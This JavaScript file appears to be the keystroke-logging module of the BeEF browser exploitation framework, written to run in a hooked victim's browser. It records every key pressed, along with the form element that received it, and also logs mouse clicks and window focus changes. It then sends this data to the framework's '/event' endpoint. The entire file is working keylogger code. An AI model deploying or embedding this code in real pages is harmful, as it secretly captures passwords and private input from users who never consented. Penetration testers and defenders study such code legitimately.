/*!
 * @literal object: beef.logger
 *
 * Provides logging capabilities.
 */
beef.logger = {
	
	running: false,
	/**
	 * Holds events created by user, to be sent back to BeEF
	 */
	events: [],
	/**
	 * Holds current stream of key presses
	 */
	stream: [],
	/**
	 * Contains current target of key presses
	 */
	target: null,
	/**
	 * Holds the time the logger was started
	 */
	time: null,
	
	/**
	 * Starts the logger
	 */
	start: function() {
		this.running = true;
		var d = new Date();
		this.time = d.getTime();
		$j(document).keypress(
			function(e) { beef.logger.keypress(e); }
		).click(
			function(e) { beef.logger.click(e); }
		);
		$j(window).focus(
			function(e) { beef.logger.win_focus(e); }
		).blur(
			function(e) { beef.logger.win_blur(e); }
		);
		/*$j('form').submit(
			function(e) { beef.logger.submit(e); }
		);*/
	},
	
	/**
	 * Stops the logger
	 */
	stop: function() {
		this.running = false;
		clearInterval(this.timer);
		$j(document).keypress(null);
	},
	
	/**
	 * Click function fires when the user clicks the mouse.
	 */
	click: function(e) {
		this.events.push({'data':'User clicked: X: '+e.pageX+' Y: '+e.pageY+' @ '+beef.logger.get_timestamp()+'s > '+beef.logger.get_dom_identifier(e.target)});
	},
	
	/**
	 * Fires when the window element has regained focus
	 */
	win_focus: function(e) {
		this.events.push({'data':'Browser has regained focus. @ '+beef.logger.get_timestamp()+'s'});
	},
	
	/**
	 * Fires when the window element has lost focus
	 */
	win_blur: function(e) {
		this.events.push({'data':'Browser has lost focus. @ '+beef.logger.get_timestamp()+'s'});
	},
	
	/**
	 * Keypress function fires everytime a key is pressed.
	 * @param {Object} e: event object
	 */
	keypress: function(e) {
		if (this.target == null || ($j(this.target).get(0) !== $j(e.target).get(0)))
		{
			beef.logger.push_stream();
			this.target = e.target;
		}
		this.stream.push({'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
	},
	
	/**
	 * Is called whenever a form is submitted
	 */
	submit: function(e) {
		this.events.push({'data':'Form submission: Action: '+$j(e.target).attr('action')+' Method: '+$j(e.target).attr('method')+' @ '+beef.logger.get_timestamp()+'s > '+beef.logger.get_dom_identifier(e.target)});
	},
	
	/**
	 * Pushes the current stream to the events queue
	 */
	push_stream: function() {
		if (this.stream.length > 0)
		{
			this.events.push({'data':beef.logger.parse_stream()});
			this.stream = [];
		}
	},
	
	/**
	 * Translate DOM Object to a readable string
	 */
	get_dom_identifier: function(target) {
		target = (target == null) ? this.target : target;
		var id = '';
		if (target)
		{
			id = target.tagName.toLowerCase();
			id += ($j(target).attr('id')) ? '#'+$j(target).attr('id') : ' ';
			id += ($j(target).attr('name')) ? '('+$j(target).attr('name')+')' : '';
		}
		return id;
	},
	
	/**
	 * Formats the timestamp
	 * @return {String} timestamp string
	 */
	get_timestamp: function() {
		var d = new Date();
		return ((d.getTime() - this.time) / 1000).toFixed(3);
	},
	
	/**
	 * Parses stream array and creates history string
	 */
	parse_stream: function() {
		var s = '';
		for (var i in this.stream)
		{
			//s += (this.stream[i]['modifiers']['alt']) ? '*alt* ' : '';
			//s += (this.stream[i]['modifiers']['ctrl']) ? '*ctrl* ' : '';
			//s += (this.stream[i]['modifiers']['shift']) ? 'Shift+' : '';
			s += String.fromCharCode(this.stream[i]['char']);
		}
		return 'User Typed: \"'+s+'\" @ '+beef.logger.get_timestamp()+'s > '+beef.logger.get_dom_identifier();
	},
	
	/**
	 * Queue results to be sent back to framework
	 */
	queue: function() {
		beef.logger.push_stream();
		if (this.events.length > 0)
		{
			var result = '';
			var j = 0;
			for (var i = this.events.length - 1; i >= 0; i--)
			{
				result += (i != this.events.length - 1) ? '&' : '';
				result += 'stream'+j+'='+this.events[i]['data'];
				j++;
			}
			beef.net.queue('/event', 0, result);
			this.events = [];
		}
	}
		
};

beef.regCmp('beef.logger');
